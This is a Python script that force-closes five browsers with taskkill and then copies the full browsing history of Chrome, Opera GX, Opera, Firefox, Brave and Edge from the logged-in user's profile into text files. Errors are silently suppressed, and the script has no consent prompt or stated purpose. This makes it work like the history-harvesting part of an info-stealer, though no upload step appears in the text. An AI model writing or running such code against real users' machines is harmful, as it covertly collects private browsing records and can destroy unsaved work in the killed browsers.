import os
import sqlite3


def chrome_history_getter(uname):
    con = sqlite3.connect(f'C:\\Users\\{uname}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History')
    cursor = con.cursor()
    cursor.execute("SELECT * FROM urls")
    urls = cursor.fetchall()
    return urls


def opera_gx_history_getter(uname):
    con = sqlite3.connect(f'C:\\Users\\{uname}\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\History')
    cursor = con.cursor()
    cursor.execute("SELECT * FROM urls")
    urls = cursor.fetchall()
    return urls


def firefox_history_getter(path):
    con = sqlite3.connect(path)
    cursor = con.cursor()
    cursor.execute("SELECT * FROM moz_places")
    urls = cursor.fetchall()
    return urls


def brave_history_getter(uname):
    con = sqlite3.connect(f"C:\\Users\\{uname}\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\History")
    cursor = con.cursor()
    cursor.execute("SELECT * FROM urls")
    urls = cursor.fetchall()
    return urls


def edge_history_getter(uname):
    con = sqlite3.connect(f"C:\\Users\\{uname}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\History")
    cursor = con.cursor()
    cursor.execute("SELECT * FROM urls")
    urls = cursor.fetchall()
    return urls


def opera_history_getter(uname):
    con = sqlite3.connect(f"C:\\Users\\{uname}\\AppData\\Roaming\\Opera Software\\Opera Stable\\History")
    cursor = con.cursor()
    cursor.execute("SELECT * FROM urls")
    urls = cursor.fetchall()
    return urls


uname = os.getlogin()
os.system("taskkill /im firefox.exe /f")
os.system("taskkill /im chrome.exe /f")
os.system("taskkill /im opera.exe /f")
os.system("taskkill /im brave.exe /f")
os.system("taskkill /im msedge.exe /f")


try:
    hist = opera_gx_history_getter(uname=uname)
    hist = str(hist)
    acc_dir = os.getcwd()
    file_path = rf"{acc_dir}\{uname}_operaGX.txt"
    with open(file_path, "w", encoding="utf-8") as f:
        f.write(hist)
except Exception:
    pass

try:
    hist = chrome_history_getter(uname=uname)
    hist = str(hist)
    acc_dir = os.getcwd()
    file_path = rf"{acc_dir}\{uname}_chrome.txt"
    with open(file_path, "w", encoding="utf-8") as f:
        f.write(hist)
except Exception:
    pass

try:
    path = f"C:\\Users\\{uname}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\"
    hist = ""
    for i in os.listdir(path):
        if "default-release" in i:
            path += f"{i}\\places.sqlite"
            hist += str(firefox_history_getter(path=path))
            path = f"C:\\Users\\{uname}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\"
    hist = str(hist)
    acc_dir = os.getcwd()
    file_path = rf"{acc_dir}\{uname}_firefox.txt"
    with open(file_path, "w", encoding="utf-8") as f:
        f.write(hist)
except Exception:
    pass


try:
    hist = brave_history_getter(uname=uname)
    hist = str(hist)
    acc_dir = os.getcwd()
    file_path = rf"{acc_dir}\{uname}_brave.txt"
    with open(file_path, "w", encoding="utf-8") as f:
        f.write(hist)
except Exception:
    pass


try:
    hist = edge_history_getter(uname=uname)
    hist = str(hist)
    acc_dir = os.getcwd()
    file_path = rf"{acc_dir}\{uname}_edge.txt"
    with open(file_path, "w", encoding="utf-8") as f:
        f.write(hist)
except Exception:
    pass

try:
    hist = opera_history_getter(uname=uname)
    hist = str(hist)
    acc_dir = os.getcwd()
    file_path = rf"{acc_dir}\{uname}_opera.txt"
    with open(file_path, "w", encoding="utf-8") as f:
        f.write(hist)
except Exception:
    pass
